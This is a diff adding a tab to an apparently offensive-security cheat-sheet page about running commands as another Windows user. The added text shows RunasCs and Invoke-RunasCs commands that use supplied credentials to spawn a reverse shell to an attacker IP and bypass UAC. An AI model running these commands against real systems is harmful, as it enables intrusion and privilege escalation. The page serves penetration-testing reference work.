@@ -19,6 +19,26 @@ runas /netonly /user:$DOMAIN\$USER "powershell.exe"
 Since the password cannot be supplied as an argument, the session must be interactive.
 {% endtab %}
 
+{% tab title="RunAsCs" %}
+[RunAsCs](https://github.com/antonioCoco/RunasCs) is a C# version of RunAs. It may be very handy on environements without the native RunAs.exe.
+
+```powershell
+#RunAs locally 
+RunasCs.exe $USERNAME $PASSWORD $CMD -d $DOMAIN
+
+#RunAs and spawn a revers shell and bypass UAC
+RunasCs.exe $USERNAME $PASSWORD $CMD -d $DOMAIN -r $ATTACKING_IP:$PORT --bypass-uac
+```
+
+Or, we may use the powershell version
+
+```powershell
+#RunAs and spawn a revers shell
+. .\Invoke-RunasCs.ps1
+Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Domain $DOMAIN -Command $CMD -Remote $ATTACKING_IP:$PORT
+```
+{% endtab %}
+
 {% tab title="Powershell" %}
 In Powershell, it is possible to impersonate a user by create a credential object and supplying it with the `-Credential` argument in the next command.
 
